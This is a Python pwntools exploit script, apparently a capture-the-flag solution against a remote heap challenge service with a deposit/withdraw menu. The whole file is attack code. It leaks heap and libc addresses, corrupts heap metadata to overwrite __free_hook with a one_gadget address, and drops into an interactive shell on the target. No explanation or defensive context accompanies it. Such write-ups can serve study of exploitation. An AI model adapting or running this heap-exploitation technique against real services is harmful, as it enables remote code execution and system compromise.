#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
port = 8888
host = "110.10.147.103"
port = 10001
context.arch = "amd64"    
r = remote(host,port)


def create(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def des(idx,value):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(value))

def withdraw(idx,value):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(value))

def show():
    r.recvuntil(":")
    r.sendline("4")

create(0x410)
create(0x80)
withdraw(1,0x80)
withdraw(1,0)
show()
r.recvuntil("ballance ")
r.recvuntil("ballance ")
heap = int(r.recvuntil("\n")) - 0x7a0
print hex(heap)
withdraw(0,0x410)
show()
r.recvuntil("ballance ")
libc = int(r.recvuntil("\n")) - 0x3ebca0
print hex(libc)
free_hook = libc + 0x3ed8e8
withdraw(1,heap+0x7a0-free_hook)
create(0x80)
create(0x80)
system = libc + 0x4f440
magic = libc + 0x4f322
withdraw(2,0x80-magic)
withdraw(3,0x80)
r.interactive()

